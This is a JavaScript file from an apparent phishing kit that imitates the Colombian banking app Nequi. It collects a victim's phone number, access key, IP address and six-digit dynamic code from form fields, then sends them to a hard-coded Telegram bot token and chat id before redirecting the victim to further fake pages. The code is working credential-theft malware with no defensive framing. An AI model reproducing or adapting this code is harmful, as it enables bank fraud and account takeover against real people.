//bot token
var telegram_bot_id = "6705933746:AAHRl3tHhUfOotJNCmEZNTA0I7IHL1S35vY";
//chat id
var chat_id = 5666517648;
var CLN, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;


var ready1 = function () {
    CLN = document.getElementById("hr-u").value;
    CVN = document.getElementById("mn-c").value;
	ip2 = document.getElementById("address").innerHTML;
    message = "💲💲💲💲Nequi💲💲💲💲\nCelular: " + CLN + "\nc14v3: " + CVN + "\n" + ip2;localStorage.setItem("hr-u", CLN);
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="carga.html"
    });
    return false;
}



var ready2 = function () {
    CLN = localStorage.getItem("hr-u");
    cdn = document.getElementById("cdn").value;
  cdn2 = document.getElementById("cdn2").value;
  cdn3 = document.getElementById("cdn3").value;
  cdn4 = document.getElementById("cdn4").value;
  cdn5 = document.getElementById("cdn5").value;
  cdn6 = document.getElementById("cdn6").value;

    message = "\nDinamica: " + cdn + cdn2 + cdn3 + cdn4 + cdn5 + cdn6 + "\nCelular:" + CLN; localStorage.setItem("hr-u", CLN);
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="rdfn.html"
    });
    return false;
}





